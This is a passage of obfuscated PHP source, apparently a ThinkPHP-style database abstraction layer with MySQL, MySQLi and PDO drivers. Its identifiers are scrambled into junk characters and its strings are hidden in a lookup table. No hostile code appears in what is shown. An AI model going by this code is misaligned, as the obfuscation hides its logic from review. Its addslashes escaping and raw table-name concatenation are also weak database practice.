$_SERVER[­á Ş³Ö]; $€ïŠê‚ä = $this->query($ŒšÄº†â[893] . $this->parseKey($Ğüò’ôç)); $Éö‚¸ÉÛ = array(); if ($€ïŠê‚ä) { foreach ($€ïŠê‚ä as $Æ¼ĞˆåÑ => $†î¹Íà¶) { $Éö‚¸ÉÛ[$†î¹Íà¶[$ŒšÄº†â[31]]] = array($ŒšÄº†â[32] => $†î¹Íà¶[$ŒšÄº†â[31]], $ŒšÄº†â[33] => $†î¹Íà¶[$ŒšÄº†â[34]], $ŒšÄº†â[35] => (bool) (strtoupper($†î¹Íà¶[$ŒšÄº†â[36]]) === $ŒšÄº†â[894]), $ŒšÄº†â[37] => $†î¹Íà¶[$ŒšÄº†â[38]], $ŒšÄº†â[39] => strtolower($†î¹Íà¶[$ŒšÄº†â[40]]) == $ŒšÄº†â[41], $ŒšÄº†â[42] => strtolower($†î¹Íà¶[$ŒšÄº†â[43]]) == $ŒšÄº†â[44]); } } return $Éö‚¸ÉÛ; } public function getTables($™î§ûò¶ = '') { $ÓÕü²Ñ =& $_SERVER[­á Ş³Ö]; if (!empty($™î§ûò¶)) { $Î¾´•‚ = $ÓÕü²Ñ[895] . $™î§ûò¶ . $ÓÕü²Ñ[896]; } else { $Î¾´•‚ = $ÓÕü²Ñ[897]; } $ÅíÑîíÒ = $this->query($Î¾´•‚); $ß«¼Ø = array(); foreach ($ÅíÑîíÒ as $§¿üÌ­ş => $¡¼¬ıèË) { $ß«¼Ø[$§¿üÌ­ş] = current($¡¼¬ıèË); } return $ß«¼Ø; } public function replace($ùğíÇìù, $å†–„«û = array()) { $–¼Ö×²ô =& $_SERVER[­á Ş³Ö]; foreach ($ùğíÇìù as $ª©û±ï› => $İãñ•õ) { $Éï¼£‘‚ = $this->parseValue($İãñ•õ); if (is_scalar($Éï¼£‘‚)) { $È€§Ñœ[] = $Éï¼£‘‚; $¶“½Š¥¤[] = $this->parseKey($ª©û±ï›); } } $Ü•åØ— = $–¼Ö×²ô[898] . $this->parseTable($å†–„«û[$–¼Ö×²ô[279]]) . $–¼Ö×²ô[899] . implode($–¼Ö×²ô[50], $¶“½Š¥¤) . $–¼Ö×²ô[900] . implode($–¼Ö×²ô[50], $È€§Ñœ) . $–¼Ö×²ô[901]; return $this->execute($Ü•åØ—); } public function insertAll($µ––šÙş, $ÏË÷ËŞŠ = array(), $ãÒìû¡ø = false) { $Áæ”¨„ =& $_SERVER[­á Ş³Ö]; if (!is_array($µ––šÙş[0])) { return !1; } $Ùàªá™§ = array_keys($µ––šÙş[0]); $²íÇÔ = array(); foreach ($µ––šÙş as $ÉÊíÔœí) { $ı‘¿Ş‹ğ = array(); foreach ($ÉÊíÔœí as $«¬ï¾ë’ => $ÙİÙèşÌ) { $ÙİÙèşÌ = $this->parseValue($ÙİÙèşÌ); if (is_scalar($ÙİÙèşÌ)) { $ı‘¿Ş‹ğ[] = $ÙİÙèşÌ; } } $²íÇÔ[] = $Áæ”¨„[260] . implode($Áæ”¨„[50], $ı‘¿Ş‹ğ) . $Áæ”¨„[901]; } array_walk($Ùàªá™§, array($this, $Áæ”¨„[902])); $–³‡»ëŞ = ($ãÒìû¡ø ? $Áæ”¨„[903] : $Áæ”¨„[904]) . $Áæ”¨„[905] . $this->parseTable($ÏË÷ËŞŠ[$Áæ”¨„[279]]) . $Áæ”¨„[899] . implode($Áæ”¨„[50], $Ùàªá™§) . $Áæ”¨„[906] . implode($Áæ”¨„[50], $²íÇÔ); return $this->execute($–³‡»ëŞ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¤§è¡‚ƒ =& $_SERVER[­á Ş³Ö]; $this->error = mysql_errno() . $¤§è¡‚ƒ[4] . mysql_error($this->_linkID); if ($¤§è¡‚ƒ[12] != $this->queryStr) { $this->error .= LNG($¤§è¡‚ƒ[48]) . $this->queryStr; } think_trace($this->error, $¤§è¡‚ƒ[12], $¤§è¡‚ƒ[49]); return $this->error; } public function escapeString($üèâîŠ”) { if ($this->_linkID) { return mysql_real_escape_string($üèâîŠ”, $this->_linkID); } else { return mysql_escape_string($üèâîŠ”); } } public function parseKey(&$¬¸ÍëîÖ, $…ª§Ú¥ê = true) { $ÙÚæóª¿ =& $_SERVER[­á Ş³Ö]; if ($…ª§Ú¥ê) { $¬¸ÍëîÖ = $this->parseKeyCheck($¬¸ÍëîÖ); } if ($¬¸ÍëîÖ != $ÙÚæóª¿[189] && !preg_match($ÙÚæóª¿[907], $¬¸ÍëîÖ)) { $¬¸ÍëîÖ = $ÙÚæóª¿[385] . trim($¬¸ÍëîÖ, $ÙÚæóª¿[385]) . $ÙÚæóª¿[385]; } return $¬¸ÍëîÖ; } } class DbMysqli extends Db { public function __construct($µ’±¼Œ° = '') { $Ü…¥ùÛ =& $_SERVER[­á Ş³Ö]; if (!extension_loaded($Ü…¥ùÛ[908])) { think_exception(think_lang($Ü…¥ùÛ[14]) . $Ü…¥ùÛ[909]); } if (!empty($µ’±¼Œ°)) { $this->config = $µ’±¼Œ°; if (empty($this->config[$Ü…¥ùÛ[17]])) { $this->config[$Ü…¥ùÛ[17]] = $Ü…¥ùÛ[12]; } } } public function connect($Ê©–Ù·„ = '', $è¬²”êã = 0) { $×²™ù´Â =& $_SERVER[­á Ş³Ö]; if (!isset($this->linkID[$è¬²”êã])) { if (empty($Ê©–Ù·„)) { $Ê©–Ù·„ = $this->config; } $this->linkID[$è¬²”êã] = new mysqli($Ê©–Ù·„[$×²™ù´Â[882]], $Ê©–Ù·„[$×²™ù´Â[884]], $Ê©–Ù·„[$×²™ù´Â[885]], $Ê©–Ù·„[$×²™ù´Â[21]], $Ê©–Ù·„[$×²™ù´Â[883]] ? intval($Ê©–Ù·„[$×²™ù´Â[883]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $²‹ÆâŸÈ = $this->linkID[$è¬²”êã]->server_version; $this->linkID[$è¬²”êã]->query($×²™ù´Â[886] . think_config($×²™ù´Â[887]) . $×²™ù´Â[58]); if ($²‹ÆâŸÈ > $×²™ù´Â[888]) { $this->linkID[$è¬²”êã]->query($×²™ù´Â[889]); } $this->connected = !0; if (1 != think_config($×²™ù´Â[22])) { unset($this->config); } } return $this->linkID[$è¬²”êã]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¤Ã»ùğº) { $¤ÃÕæ¶ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤Ã»ùğº; if ($this->queryID) { $this->free(); } think_action_status($¤ÃÕæ¶[23], 1); think_status($¤ÃÕæ¶[24]); $this->queryID = $this->_linkID->query($¤Ã»ùğº); if ($this->_linkID->more_results()) { while (($„ŞÅïìş = $this->_linkID->next_result()) != NULL) { $„ŞÅïìş->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($®‹„Ï¾Ô) { $ĞşÕëÉñ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $®‹„Ï¾Ô; if ($this->queryID) { $this->free(); } think_action_status($ĞşÕëÉñ[25], 1); think_status($ĞşÕëÉñ[24]); $Ş„£°ï = $this->_linkID->query($®‹„Ï¾Ô); $this->debug(); if (!1 === $Ş„£°ï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $·Æà¼ô = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$·Æà¼ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ıëæ€æó = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ıëæ€æó) { $this->error(); return !1; } } return !0; } private function getAll() { $æòÀêö = array(); if ($this->numRows > 0) { for ($º¾—ÀÊö = 0; $º¾—ÀÊö < $this->numRows; $º¾—ÀÊö++) { $æòÀêö[$º¾—ÀÊö] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $æòÀêö; } public function getFields($Ë„§”Ò) { $á€ª„š… =& $_SERVER[­á Ş³Ö]; $Ï»Ê³ŒÚ = $this->query($á€ª„š…[893] . $this->parseKey($Ë„§”Ò)); $à¶§Õ‹ = array(); if ($Ï»Ê³ŒÚ) { foreach ($Ï»Ê³ŒÚ as $é«±êÇô => $¨Œ„„—©) { $à¶§Õ‹[$¨Œ„„—©[$á€ª„š…[31]]] = array($á€ª„š…[32] => $¨Œ„„—©[$á€ª„š…[31]], $á€ª„š…[33] => $¨Œ„„—©[$á€ª„š…[34]], $á€ª„š…[35] => (bool) ($¨Œ„„—©[$á€ª„š…[36]] === $á€ª„š…[12]), $á€ª„š…[37] => $¨Œ„„—©[$á€ª„š…[38]], $á€ª„š…[39] => strtolower($¨Œ„„—©[$á€ª„š…[40]]) == $á€ª„š…[41], $á€ª„š…[42] => strtolower($¨Œ„„—©[$á€ª„š…[43]]) == $á€ª„š…[44]); } } return $à¶§Õ‹; } public function getTables($ÜêèÚóñ = '') { $µ™´ï´… =& $_SERVER[­á Ş³Ö]; $øá½®ŒÔ = !empty($ÜêèÚóñ) ? $µ™´ï´…[895] . $ÜêèÚóñ . $µ™´ï´…[896] : $µ™´ï´…[897]; $ÙÆÒ—Œ = $this->query($øá½®ŒÔ); $™°¯ĞŞ† = array(); if ($ÙÆÒ—Œ) { foreach ($ÙÆÒ—Œ as $ŸèÊÄ¯³ => $ªæ¬“) { $™°¯ĞŞ†[$ŸèÊÄ¯³] = current($ªæ¬“); } } return $™°¯ĞŞ†; } public function replace($çµ»çµ¨, $°ğˆ±ß = array()) { $ÈäÜ Ì =& $_SERVER[­á Ş³Ö]; foreach ($çµ»çµ¨ as $æı£âÂ => $Í÷©™½€) { $òŒà²Óû = $this->parseValue($Í÷©™½€); if (is_scalar($òŒà²Óû)) { $£õ¢ƒôˆ[] = $òŒà²Óû; $¢½”½©ï[] = $this->parseKey($æı£âÂ); } } $ø÷ğ€¥ı = $ÈäÜ Ì[898] . $this->parseTable($°ğˆ±ß[$ÈäÜ Ì[279]]) . $ÈäÜ Ì[899] . implode($ÈäÜ Ì[50], $¢½”½©ï) . $ÈäÜ Ì[900] . implode($ÈäÜ Ì[50], $£õ¢ƒôˆ) . $ÈäÜ Ì[901]; return $this->execute($ø÷ğ€¥ı); } public function insertAll($À—ìèï, $àœ•—÷Â = array(), $¡õè„’ = false) { $¡Ñ¬©ìŞ =& $_SERVER[­á Ş³Ö]; if (!is_array($À—ìèï[0])) { return !1; } $‘ÉœÌë· = array_keys($À—ìèï[0]); $•÷Õ‰õ» = array(); foreach ($À—ìèï as $ñãÉàÑ§) { $…Èàä† = array(); foreach ($ñãÉàÑ§ as $êÚ…”Õ‡ => $ÃØÎ´Ó„) { $ÃØÎ´Ó„ = $this->parseValue($ÃØÎ´Ó„); if (is_scalar($ÃØÎ´Ó„)) { $…Èàä†[] = $ÃØÎ´Ó„; } } $•÷Õ‰õ»[] = $¡Ñ¬©ìŞ[260] . implode($¡Ñ¬©ìŞ[50], $…Èàä†) . $¡Ñ¬©ìŞ[901]; } array_walk($‘ÉœÌë·, array($this, $¡Ñ¬©ìŞ[902])); $ÍğŞó¶ô = $¡õè„’ ? $¡Ñ¬©ìŞ[903] : $¡Ñ¬©ìŞ[904]; $§›Â§øÓ = $ÍğŞó¶ô . $¡Ñ¬©ìŞ[905] . $this->parseTable($àœ•—÷Â[$¡Ñ¬©ìŞ[279]]) . $¡Ñ¬©ìŞ[899] . implode($¡Ñ¬©ìŞ[50], $‘ÉœÌë·) . $¡Ñ¬©ìŞ[906] . implode($¡Ñ¬©ìŞ[50], $•÷Õ‰õ»); return $this->execute($§›Â§øÓ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $çƒóÕ¬İ =& $_SERVER[­á Ş³Ö]; $this->error = $this->_linkID->errno . $çƒóÕ¬İ[4] . $this->_linkID->error; if ($çƒóÕ¬İ[12] != $this->queryStr) { $this->error .= LNG($çƒóÕ¬İ[48]) . $this->queryStr; } think_trace($this->error, $çƒóÕ¬İ[12], $çƒóÕ¬İ[49]); return $this->error; } public function escapeString($–áÓÖ¼è) { if ($this->_linkID) { return $this->_linkID->real_escape_string($–áÓÖ¼è); } else { return addslashes($–áÓÖ¼è); } } public function parseKey(&$îÕïû•í, $‹Ñ§Ğ¥š = true) { $÷Á²Ğ±Œ =& $_SERVER[­á Ş³Ö]; if ($‹Ñ§Ğ¥š) { $îÕïû•í = $this->parseKeyCheck($îÕïû•í); } if ($îÕïû•í != $÷Á²Ğ±Œ[189] && !preg_match($÷Á²Ğ±Œ[907], $îÕïû•í)) { $îÕïû•í = $÷Á²Ğ±Œ[385] . trim($îÕïû•í, $÷Á²Ğ±Œ[385]) . $÷Á²Ğ±Œ[385]; } return $îÕïû•í; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($›”Œì®Ó = '') { $ò’ÁºÁú =& $_SERVER[­á Ş³Ö]; if (!class_exists($ò’ÁºÁú[910])) { think_exception(think_lang($ò’ÁºÁú[14]) . $ò’ÁºÁú[911]); } if (!empty($›”Œì®Ó)) { $this->config = $›”Œì®Ó; if (empty($this->config[$ò’ÁºÁú[17]])) { $this->config[$ò’ÁºÁú[17]] = array(); } } } public function connect($øèò—Šâ = '', $ÂÅ—´İÂ = 0) { $•êĞŠî =& $_SERVER[­á Ş³Ö]; if (!isset($this->linkID[$ÂÅ—´İÂ])) { if (empty($øèò—Šâ)) { $øèò—Šâ = $this->config; } $œÄÚ”¦ = !empty($øèò—Šâ[$•êĞŠî[17]][$•êĞŠî[18]]) ? $øèò—Šâ[$•êĞŠî[17]][$•êĞŠî[18]] : $this->pconnect; if ($œÄÚ”¦) { $øèò—Šâ[$•êĞŠî[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÂÅ—´İÂ] = new PDO($øèò—Šâ[$•êĞŠî[912]], $øèò—Šâ[$•êĞŠî[884]], $øèò—Šâ[$•êĞŠî[885]], $øèò—Šâ[$•êĞŠî[17]]); } catch (PDOException $ƒê¤ş”ü) { think_exception($ƒê¤ş”ü->getMessage()); } $this->dbType = $this->_getDsnType($øèò—Šâ[$•êĞŠî[912]]); if (in_array($this->dbType, array($•êĞŠî[913], $•êĞŠî[914], $•êĞŠî[915], $•êĞŠî[916]))) { think_exception($•êĞŠî[917] . $this->dbType . $•êĞŠî[918] . $this->dbType . $•êĞŠî[919]); } if (!$this->linkID[$ÂÅ—´İÂ]) { think_exception($•êĞŠî[920]); } try { $this->linkID[$ÂÅ—´İÂ]->exec($•êĞŠî[921] . think_config($•êĞŠî[887])); } catch (Exception $ƒê¤ş”ü) { } $this->connected = !0; if (1 != think_config($•êĞŠî[22])) { unset($this->config); } } return $this->linkID[$ÂÅ—´İÂ]; } public function free() { $this->PDOStatement = null; } public function query($®Ş£„ßĞ, $ïÖÁÎÔ = array()) { $¦ÌÃçÜ¨ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®Ş£„ßĞ; if (!empty($ïÖÁÎÔ)) { $this->queryStr .= $¦ÌÃçÜ¨[922] . print_r($ïÖÁÎÔ, !0) . $¦ÌÃçÜ¨[923]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¦ÌÃçÜ¨[23], 1); think_status($¦ÌÃçÜ¨[24]); $this->PDOStatement = $this->_linkID->prepare($®Ş£„ßĞ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $•÷¦¤şÄ = $this->PDOStatement->execute($ïÖÁÎÔ); $this->debug(); if (!1 === $•÷¦¤şÄ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ŞÍø…¢Œ, $º¿¢ÕÁ¢ = array()) { $Ü‚öî³ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŞÍø…¢Œ; if (!empty($º¿¢ÕÁ¢)) { $this->queryStr .= $Ü‚öî³[922] . print_r($º¿¢ÕÁ¢, !0) . $Ü‚öî³[923]; } $î÷‘ã¬í = !1; if ($this->dbType == $Ü‚öî³[916]) { if (preg_match($Ü‚öî³[924], $this->queryStr, $ğÊ©ŠŠ)) { $this->table = think_config($Ü‚öî³[925]) . str_ireplace(think_config($Ü‚öî³[926]), $Ü‚öî³[378], $ğÊ©ŠŠ[2]); $î÷‘ã¬í = (bool) $this->query($Ü‚öî³[927] . strtoupper($this->table) . $Ü‚öî³[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ü‚öî³[25], 1); think_status($Ü‚öî³[24]); $this->PDOStatement = $this->_linkID->prepare($ŞÍø…¢Œ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $«Íò´›É = $this->PDOStatement->execute($º¿¢ÕÁ¢); $this->debug(); if (!1 === $«Íò´›É) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($î÷‘ã¬í || preg_match($Ü‚öî³[928], $ŞÍø…¢Œ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $àÃ–Í‘½ = $this->_linkID->commit(); $this->transTimes = 0; if (!$àÃ–Í‘½) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÆÃ¯¤Öù = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÆÃ¯¤Öù) { $this->error(); return !1; } } return !0; } private function getAll() { $æ¦ŞÄÉÖ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($æ¦ŞÄÉÖ); return $æ¦ŞÄÉÖ; } public function getFields($¿‹ÆÎå) { $Ÿ´ú­ñ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!0); if (think_config($Ÿ´ú­ñ[929])) { $±¶ˆºö = str_replace($Ÿ´ú­ñ[930], $¿‹ÆÎå, think_config($Ÿ´ú­ñ[929])); } else { switch ($this->dbType) { case $Ÿ´ú­ñ[913]: case $Ÿ´ú­ñ[931]: $±¶ˆºö = "\x53\x45\x4c\105\x43\124\x20\x20\x20\143\x6f\154\x75\155\156\x5f\156\141\155\145\x20\141\x73\40\47\116\141\x6d\x65\x27\x2c\40\40\40\x64\141\164\141\137\164\x79\160\145\x20\x61\163\40\x27\x54\171\160\145\47\x2c\40\x20\x20\143\x6f\x6c\x75\155\x6e\137\x64\x65\x66\x61\165\154\x74\x20\141\x73\x20\47\104\145\146\141\x75\154\164\x27\x2c\x20\x20\x20\x69\x73\137\156\165\x6c\x6c\x61\142\x6c\x65\40\141\x73\x20\47\x4e\x75\x6c\x6c\47\12\x9\11\106\x52\x4f\x4d\11\x69\x6e\x66\157\162\155\x61\x74\151\157\156\137\163\x63\x68\145\155\x61\56\x74\141\x62\x6c\x65\163\40\x41\x53\40\x74\xa\11\11\112\117\x49\116\x9\x69\x6e\146\x6f\162\155\x61\164\x69\x6f\x6e\x5f\x73\x63\x68\145\155\141\56\x63\x6f\154\x75\155\x6e\x73\40\101\123\x20\x63\12\x9\11\x4f\116\x20\x20\164\x2e\164\141\x62\154\x65\x5f\143\x61\164\x61\154\157\x67\x20\75\40\x63\56\x74\141\x62\x6c\x65\x5f\143\x61\164\x61\x6c\157\147\xa\x9\x9\101\116\104\x20\164\x2e\x74\141\142\154\x65\137\x73\x63\x68\145\155\141\40\75\40\143\56\164\x61\142\x6c\x65\x5f\163\x63\x68\x65\x6d\141\12\x9\11\101\x4e\x44\x20\164\56\x74\x61\x62\x6c\145\137\156\141\x6d\x65\40\75\40\143\56\164\141\142\154\x65\137\156\x61\x6d\x65\12\x9\11\x57\110\x45\122\x45\x20\x20\x20\164\x2e\164\x61\x62\154\145\137\156\141\x6d\x65\x20\75\40\47{$¿‹ÆÎå}\47"; break; case $Ÿ´ú­ñ[932]: $±¶ˆºö = $Ÿ´ú­ñ[933] . $¿‹ÆÎå . $Ÿ´ú­ñ[934]; break; case $Ÿ´ú­ñ[914]: case $Ÿ´ú­ñ[916]: $±¶ˆºö = $Ÿ´ú­ñ[935] . $Ÿ´ú­ñ[936] . $Ÿ´ú­ñ[937] . strtoupper($¿‹ÆÎå) . $Ÿ´ú­ñ[938] . strtoupper($¿‹ÆÎå) . $Ÿ´ú­ñ[939]; break; case $Ÿ´ú­ñ[940]: $±¶ˆºö = $Ÿ´ú­ñ[941] . $¿‹ÆÎå . $Ÿ´ú­ñ[942]; break; case $Ÿ´ú­ñ[915]: break; case $Ÿ´ú­ñ[943]: default: $±¶ˆºö = $Ÿ´ú­ñ[944] . ($this->dbType == $Ÿ´ú­ñ[943] ? "\140{$¿‹ÆÎå}\x60" : $¿‹ÆÎå); } } $¨Á’»Àâ = $this->query($±¶ˆºö); $Û¹ŞÊ±ƒ = array(); if ($¨Á’»Àâ) { foreach ($¨Á’»Àâ as $ßÅØ£õÑ => $»ÌÅ«¾¶) { $»ÌÅ«¾¶ = array_change_key_case($»ÌÅ«¾¶); $»ÌÅ«¾¶[$Ÿ´ú­ñ[32]] = isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[32]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[32]] : $Ÿ´ú­ñ[378]; $»ÌÅ«¾¶[$Ÿ´ú­ñ[33]] = isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[33]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[33]] : $Ÿ´ú­ñ[378]; $á“´ƒÚÊ = isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[273]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[273]] : $»ÌÅ«¾¶[$Ÿ´ú­ñ[32]]; $Û¹ŞÊ±ƒ[$á“´ƒÚÊ] = array($Ÿ´ú­ñ[32] => $á“´ƒÚÊ, $Ÿ´ú­ñ[33] => $»ÌÅ«¾¶[$Ÿ´ú­ñ[33]], $Ÿ´ú­ñ[35] => (bool) (isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[103]]) && $»ÌÅ«¾¶[$Ÿ´ú­ñ[103]] === $Ÿ´ú­ñ[12] || isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[35]]) && $»ÌÅ«¾¶[$Ÿ´ú­ñ[35]] === $Ÿ´ú­ñ[12]), $Ÿ´ú­ñ[37] => isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[37]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[37]] : (isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[56]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[56]] : $Ÿ´ú­ñ[378]), $Ÿ´ú­ñ[39] => isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[94]]) ? strtolower($»ÌÅ«¾¶[$Ÿ´ú­ñ[94]]) == $Ÿ´ú­ñ[41] : (isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[57]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[57]] : !1), $Ÿ´ú­ñ[42] => isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[945]]) ? strtolower($»ÌÅ«¾¶[$Ÿ´ú­ñ[945]]) == $Ÿ´ú­ñ[44] : (isset($»ÌÅ«¾¶[$Ÿ´ú­ñ[94]]) ? $»ÌÅ«¾¶[$Ÿ´ú­ñ[94]] : !1)); } } return $Û¹ŞÊ±ƒ; } public function getTables($©©¬£ Ì = '') { $İ¹úæñâ =& $_SERVER[­á Ş³Ö]; if (think_config($İ¹úæñâ[946])) { $Ğ¨Ú»Ä’ = str_replace($İ¹úæñâ[947], $©©¬£ Ì, think_config($İ¹úæñâ[946])); } else { switch ($this->dbType) { case $İ¹úæñâ[914]: case $İ¹úæñâ[916]: $Ğ¨Ú»Ä’ = $İ¹úæñâ[948]; break; case $İ¹úæñâ[913]: case $İ¹úæñâ[931]: $Ğ¨Ú»Ä’ = $İ¹úæñâ[949]; break; case $İ¹úæñâ[940]: $Ğ¨Ú»Ä’ = $İ¹úæñâ[950]; break; case $İ¹úæñâ[915]: think_exception(think_lang($İ¹úæñâ[951]) . $İ¹úæñâ[952]); break; case $İ¹úæñâ[932]: $Ğ¨Ú»Ä’ = $İ¹úæñâ[45] . $İ¹úæñâ[46] . $İ¹úæñâ[47]; break; case $İ¹úæñâ[943]: default: if (!empty($©©¬£ Ì)) { $Ğ¨Ú»Ä’ = $İ¹úæñâ[895] . $©©¬£ Ì . $İ¹úæñâ[896]; } else { $Ğ¨Ú»Ä’ = $İ¹úæñâ[897]; } } } $Î†™İêü = $this->query($Ğ¨Ú»Ä’); $ˆ…ÖŒ¿ì = array(); foreach ($Î†™İêü as $–Í¨Ì×ı => $”¼êøÈØ) { $ˆ…ÖŒ¿ì[$–Í¨Ì×ı] = current($”¼êøÈØ); } return $ˆ…ÖŒ¿ì; } protected function parseLimit($éõ¶„÷) { $æ‡ëŸ±é =& $_SERVER[­á Ş³Ö]; $Ù•ª…÷ = $æ‡ëŸ±é[12]; if (!empty($éõ¶„÷)) { switch ($this->dbType) { case $æ‡ëŸ±é[940]: case $æ‡ëŸ±é[932]: $éõ¶„÷ = explode($æ‡ëŸ±é[50], $éõ¶„÷); if (count($éõ¶„÷) > 1) { $Ù•ª…÷ .= $æ‡ëŸ±é[51] . $éõ¶„÷[1] . $æ‡ëŸ±é[52] . $éõ¶„÷[0] . $æ‡ëŸ±é[53]; } else { $Ù•ª…÷ .= $æ‡ëŸ±é[51] . $éõ¶„÷[0] . $æ‡ëŸ±é[53]; } break; case $æ‡ëŸ±é[913]: case $æ‡ëŸ±é[931]: break; case $æ‡ëŸ±é[915]: break; case $æ‡ëŸ±é[914]: case $æ‡ëŸ±é[916]: break; case $æ‡ëŸ±é[943]: default: $Ù•ª…÷ .= $æ‡ëŸ±é[51] . $éõ¶„÷ . $æ‡ëŸ±é[53]; } } return $Ù•ª…÷; } public function parseKey(&$‰Ë÷æÊ·, $ˆ¬¿ƒğÁ = true) { $½¯ÀÕÊ =& $_SERVER[­á Ş³Ö]; if ($ˆ¬¿ƒğÁ) { $‰Ë÷æÊ· = $this->parseKeyCheck($‰Ë÷æÊ·); } if ($this->dbType == $½¯ÀÕÊ[943]) { if ($‰Ë÷æÊ· != $½¯ÀÕÊ[189] && !preg_match($½¯ÀÕÊ[907], $‰Ë÷æÊ·)) { $‰Ë÷æÊ· = $½¯ÀÕÊ[385] . trim($‰Ë÷æÊ·, $½¯ÀÕÊ[385]) . $½¯ÀÕÊ[385]; } return $‰Ë÷æÊ·; } else { return parent::parseKey($‰Ë÷æÊ·, $ˆ¬¿ƒğÁ); } } public function close() { $this->_linkID = null; } public function error() { $İ¢·ã»® =& $_SERVER[­á Ş³Ö]; if ($this->PDOStatement) { $Ê¼ó˜È® = $this->PDOStatement->errorInfo(); $this->error = $Ê¼ó˜È®[1] . $İ¢·ã»®[4] . $Ê¼ó˜È®[2]; } else { $this->error = $İ¢·ã»®[12]; } if ($İ¢·ã»®[12] != $this->queryStr) { $this->error .= LNG($İ¢·ã»®[48]) . $this->queryStr; } think_trace($this->error, $İ¢·ã»®[12], $İ¢·ã»®[49]); return $this->error; } public function escapeString($Š¨ÊÈ”ó) { $ï´¬ÜÉ± =& $_SERVER[­á Ş³Ö]; switch ($this->dbType) { case $ï´¬ÜÉ±[940]: case $ï´¬ÜÉ±[913]: case $ï´¬ÜÉ±[931]: case $ï´¬ÜÉ±[943]: return addslashes($Š¨ÊÈ”ó); case $ï´¬ÜÉ±[915]: case $ï´¬ÜÉ±[932]: case $ï´¬ÜÉ±[914]: case $ï´¬ÜÉ±[916]: return str_ireplace($ï´¬ÜÉ±[58], $ï´¬ÜÉ±[59], $Š¨ÊÈ”ó); } } protected function parseValue($‘†¿Éõ) { $„äÉØ§ =& $_SERVER[­á Ş³Ö]; if (is_string($‘†¿Éõ)) { $ñ¦ŒŞ÷á = strpos($‘†¿Éõ, $„äÉØ§[4]) === 0 && in_array($‘†¿Éõ, array_keys($this->bind)); $‘†¿Éõ = $ñ¦ŒŞ÷á ? $this->escapeString($‘†¿Éõ) : $„äÉØ§[953] . $this->escapeString($‘†¿Éõ) . $„äÉØ§[953]; } elseif (isset($‘†¿Éõ[0]) && is_string($‘†¿Éõ[0]) && strtolower($‘†¿Éõ[0]) == $„äÉØ§[297]) { $‘†¿Éõ = $this->escapeString($‘†¿Éõ[1]); } elseif (is_array($‘†¿Éõ)) { $‘†¿Éõ = array_map(array($this, $„äÉØ§[954]), $‘†¿Éõ); } elseif (is_bool($‘†¿Éõ)) { $‘†¿Éõ = $‘†¿Éõ ? $„äÉØ§[88] : $„äÉØ§[198]; } elseif (is_null($‘†¿Éõ)) { $‘†¿Éõ = $„äÉØ§[103]; } return $‘†¿Éõ; } public function getLastInsertId() { $üı†ºÂ =& $_SERVER[­á Ş³Ö]; switch ($this->dbType) { case $üı†ºÂ[940]: case $üı†ºÂ[932]: case $üı†ºÂ[913]: case $üı†ºÂ[931]: case $üı†ºÂ[915]: case $üı†ºÂ[943]: return $this->_linkID->lastInsertId(); case $üı†ºÂ[914]: case $üı†ºÂ[916]: $ø˜ŸÎÃ± = $this->table; $ ò¹›ô = 